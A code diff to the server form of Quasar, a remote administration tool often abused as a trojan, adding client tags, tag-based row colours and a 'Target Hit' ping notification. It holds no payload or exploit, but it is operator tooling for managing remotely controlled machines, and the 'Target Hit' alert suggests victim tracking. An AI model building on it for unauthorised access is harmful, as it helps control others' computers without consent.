@@ -30,6 +30,7 @@ namespace Quasar.Server.Forms
         private const int ACCEPT_PING_ID = 2;
         private const int INSTALL_TIME_ID = 3;
         private const int LAST_PING_TIME_ID = 4;
+        private const int TAG_ID = 10;
 
         private bool _titleUpdateRunning;
         private bool _processingClientConnections;
@@ -40,6 +41,10 @@ namespace Quasar.Server.Forms
         private readonly object _lockClients = new object(); // lock for clients-listview
         private readonly ClientDatabase _clientDb;
         private volatile int _loadingDbRows;
+        private ToolStripMenuItem _tagsMenuStripItem;
+        private ToolStripMenuItem _manageTagsMenuItem;
+        private ToolStripMenuItem _setTagToolStripMenuItem;
+        private readonly Dictionary<string, Color> _tagBackColors = new Dictionary<string, Color>(StringComparer.OrdinalIgnoreCase);
 
         public FrmMain()
         {
@@ -53,6 +58,7 @@ namespace Quasar.Server.Forms
             lstClients.DrawItem += lstClients_DrawItem;
             lstClients.DrawSubItem += lstClients_DrawSubItem;
             lstClients.MouseUp += lstClients_MouseUp;
+            InitializeTagMenus();
         }
 
         /// <summary>
@@ -100,6 +106,119 @@ namespace Quasar.Server.Forms
             {
             }
             _titleUpdateRunning = false;
+        }
+
+        private void InitializeTagMenus()
+        {
+            _tagsMenuStripItem = new ToolStripMenuItem("Tag");
+            _manageTagsMenuItem = new ToolStripMenuItem("Manage Tags...");
+            _manageTagsMenuItem.Click += manageTagsMenuItem_Click;
+            _tagsMenuStripItem.DropDownItems.Add(_manageTagsMenuItem);
+            menuStrip.Items.Insert(2, _tagsMenuStripItem);
+
+            _setTagToolStripMenuItem = new ToolStripMenuItem("Set Tag");
+            _setTagToolStripMenuItem.DropDownOpening += setTagToolStripMenuItem_DropDownOpening;
+            int clientMgmtIdx = contextMenuStrip.Items.IndexOf(connectionToolStripMenuItem);
+            if (clientMgmtIdx >= 0)
+                contextMenuStrip.Items.Insert(clientMgmtIdx + 1, _setTagToolStripMenuItem);
+            else
+                contextMenuStrip.Items.Add(_setTagToolStripMenuItem);
+        }
+
+        private void setTagToolStripMenuItem_DropDownOpening(object sender, EventArgs e)
+        {
+            _setTagToolStripMenuItem.DropDownItems.Clear();
+            var tags = _clientDb.LoadAllTags();
+            if (tags.Count == 0)
+            {
+                var emptyItem = new ToolStripMenuItem("(Empty)") { Enabled = false };
+                _setTagToolStripMenuItem.DropDownItems.Add(emptyItem);
+                return;
+            }
+
+            foreach (var tag in tags)
+            {
+                var item = new ToolStripMenuItem(tag.Name) { Tag = tag.Name };
+                item.Click += setTagValueItem_Click;
+                _setTagToolStripMenuItem.DropDownItems.Add(item);
+            }
+        }
+
+        private void setTagValueItem_Click(object sender, EventArgs e)
+        {
+            var item = sender as ToolStripMenuItem;
+            string tagName = item?.Tag as string ?? "";
+            if (string.IsNullOrWhiteSpace(tagName)) return;
+
+            var selectedClients = GetSelectedClients();
+            foreach (var client in selectedClients)
+            {
+                if (client?.Value != null) client.Value.Tag = tagName;
+            }
+
+            foreach (ListViewItem lvi in lstClients.SelectedItems)
+            {
+                if (lvi == null || lvi.SubItems.Count <= UUID_ID || lvi.SubItems.Count <= TAG_ID) continue;
+                string uuid = lvi.SubItems[UUID_ID].Text;
+                if (string.IsNullOrWhiteSpace(uuid)) continue;
+                _clientDb.SetClientTag(uuid, tagName);
+                lvi.SubItems[TAG_ID].Text = tagName;
+            }
+
+            lstClients.Invalidate();
+        }
+
+        private void manageTagsMenuItem_Click(object sender, EventArgs e)
+        {
+            using (var frm = new FrmManageTags(_clientDb, () =>
+            {
+                RefreshTagColorsCache();
+                lstClients.Invalidate();
+            }))
+            {
+                frm.ShowDialog(this);
+            }
+        }
+
+        private void RefreshTagColorsCache()
+        {
+            _tagBackColors.Clear();
+            foreach (var tag in _clientDb.LoadAllTags())
+            {
+                if (string.IsNullOrWhiteSpace(tag.Name) || string.IsNullOrWhiteSpace(tag.Color))
+                    continue;
+                if (TryParseHtmlColor(tag.Color, out var c))
+                    _tagBackColors[tag.Name.Trim()] = c;
+            }
+        }
+
+        private static bool TryParseHtmlColor(string value, out Color color)
+        {
+            color = Color.Empty;
+            try
+            {
+                color = ColorTranslator.FromHtml((value ?? "").Trim());
+                return color.A > 0 || color == Color.Black || color == Color.White;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        private static Color GetReadableTextColor(Color background)
+        {
+            double luminance = (0.299 * background.R) + (0.587 * background.G) + (0.114 * background.B);
+            return luminance < 140 ? Color.White : Color.Black;
+        }
+
+        private bool TryGetRowTagBackColor(ListViewItem item, out Color color)
+        {
+            color = Color.Empty;
+            if (item == null || item.SubItems.Count <= TAG_ID) return false;
+            string tagName = (item.SubItems[TAG_ID].Text ?? "").Trim();
+            if (tagName.Length == 0) return false;
+            return _tagBackColors.TryGetValue(tagName, out color);
         }
 
         private void InitializeServer()
@@ -179,6 +298,7 @@ namespace Quasar.Server.Forms
             InitializeServer();
             _clientDb.Initialize();
             _clientDb.SetAllClientsDisconnected();
+            RefreshTagColorsCache();
             LoadClientsFromDatabase();
             AutostartListening();
         }
@@ -212,9 +332,19 @@ namespace Quasar.Server.Forms
         private void lstClients_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
         {
             bool selected = (e.ItemState & ListViewItemStates.Selected) != 0;
-            e.Graphics.FillRectangle(
-                selected ? SystemBrushes.Highlight : SystemBrushes.Window,
-                e.Bounds);
+            Color rowBack = SystemColors.Window;
+            if (!selected && TryGetRowTagBackColor(e.Item, out var tagBack))
+                rowBack = tagBack;
+            Color rowFore = selected ? SystemColors.HighlightText : GetReadableTextColor(rowBack);
+            if (selected)
+            {
+                e.Graphics.FillRectangle(SystemBrushes.Highlight, e.Bounds);
+            }
+            else
+            {
+                using (var bgBrush = new SolidBrush(rowBack))
+                    e.Graphics.FillRectangle(bgBrush, e.Bounds);
+            }
 
             if (e.ColumnIndex == STATUS_ID)
             {
@@ -279,7 +409,7 @@ namespace Quasar.Server.Forms
                 TextRenderer.DrawText(
                     e.Graphics, ipText, e.SubItem.Font,
                     new Rectangle(startX, e.Bounds.Top, e.Bounds.Right - startX, e.Bounds.Height),
-                    selected ? SystemColors.HighlightText : e.SubItem.ForeColor,
+                    rowFore,
                     TextFormatFlags.Left | TextFormatFlags.VerticalCenter | TextFormatFlags.EndEllipsis);
                 return;
             }
@@ -289,7 +419,7 @@ namespace Quasar.Server.Forms
                 e.SubItem?.Text ?? "",
                 e.SubItem.Font,
                 e.Bounds,
-                selected ? SystemColors.HighlightText : e.SubItem.ForeColor,
+                rowFore,
                 TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter | TextFormatFlags.EndEllipsis);
         }
 
@@ -467,11 +597,15 @@ namespace Quasar.Server.Forms
                 string uuid = client.Value.Id;
                 string status = "Connected";
                 string userStatus = "Active";
+                string serverTag = _clientDb.GetClientTag(uuid);
+                if (string.IsNullOrWhiteSpace(serverTag))
+                    serverTag = client.Value.Tag ?? "";
+                client.Value.Tag = serverTag;
 
                 var row = _clientDb.UpsertClientBasics(
                     uuid,
                     client.EndPoint.Address.ToString(),
-                    client.Value.Tag,
+                    serverTag,
                     client.Value.UserAtPc,
                     client.Value.Version,
                     status,
@@ -498,7 +632,7 @@ namespace Quasar.Server.Forms
                     lviExisting.SubItems[IP_ADDRESS_ID].Tag = client.Value.ImageIndex;
                     lviExisting.SubItems[8].Text = client.Value.OperatingSystem;
                     lviExisting.SubItems[9].Text = "";
-                    lviExisting.SubItems[10].Text = client.Value.Tag;
+                    lviExisting.SubItems[TAG_ID].Text = serverTag;
                     lviExisting.SubItems[11].Text = client.Value.AccountType;
                     lviExisting.SubItems[12].Text = client.Value.UserAtPc;
                 }
@@ -517,7 +651,7 @@ namespace Quasar.Server.Forms
                         " " + client.EndPoint.Address, // IP Address
                         client.Value.OperatingSystem, // OS
                         "",                           // Warsal
-                        client.Value.Tag,             // Tag
+                        serverTag,                    // Tag
                         client.Value.AccountType,     // Account Type
                         client.Value.UserAtPc         // User@PC
                     }) { Tag = client, ImageIndex = -1 };
@@ -552,13 +686,16 @@ namespace Quasar.Server.Forms
             {
                 string uuid = client.Value.Id;
                 var lvi = GetListViewItemByUuid(uuid);
+                string serverTag = _clientDb.GetClientTag(uuid);
+                if (string.IsNullOrWhiteSpace(serverTag))
+                    serverTag = client.Value.Tag ?? "";
 
                 string existingUserStatus = "Active";
 
                 var row = _clientDb.UpsertClientBasics(
                     uuid,
                     client.EndPoint.Address.ToString(),
-                    client.Value.Tag,
+                    serverTag,
                     client.Value.UserAtPc,
                     client.Value.Version,
                     "Disconnected",
@@ -588,7 +725,7 @@ namespace Quasar.Server.Forms
                         lvi.SubItems[IP_ADDRESS_ID].Tag = client.Value.ImageIndex;
                         lvi.SubItems[8].Text = client.Value.OperatingSystem;
                         lvi.SubItems[9].Text = "";
-                        lvi.SubItems[10].Text = client.Value.Tag;
+                        lvi.SubItems[TAG_ID].Text = serverTag;
                         lvi.SubItems[11].Text = client.Value.AccountType;
                         lvi.SubItems[12].Text = client.Value.UserAtPc;
                     }
@@ -656,7 +793,7 @@ namespace Quasar.Server.Forms
             }
         }
 
-        private void SetPingByClient(object sender, Client client, DateTime pingTimeUtc)
+        private void SetPingByClient(object sender, Client client, DateTime pingTimeUtc, ClientPingRequest ping)
         {
             if (client == null || client.Value == null) return;
 
@@ -681,11 +818,14 @@ namespace Quasar.Server.Forms
                     string who = client.Value.UserAtPc;
                     if (string.IsNullOrWhiteSpace(who) || who.Trim() == "@")
                         who = string.IsNullOrWhiteSpace(client.Value.Username) ? (uuid ?? "Client") : $"{client.Value.Username}@{client.Value.PcName}";
+                    bool isTargetHit = ping?.TargetHit ?? false;
                     string status = acceptPing ? "accepted" : "ignored";
                     notifyIcon.ShowBalloonTip(
                         2000,
-                        "Ping received",
-                        $"{who} ({ip}) ping {status} at {FormatNullableUtc(pingTimeUtc)}",
+                        isTargetHit ? "Target Hit" : "Ping received",
+                        isTargetHit
+                            ? $"{who} ({ip}) target hit at {FormatNullableUtc(pingTimeUtc)}"
+                            : $"{who} ({ip}) ping {status} at {FormatNullableUtc(pingTimeUtc)}",
                         ToolTipIcon.Info);
                 });
             }
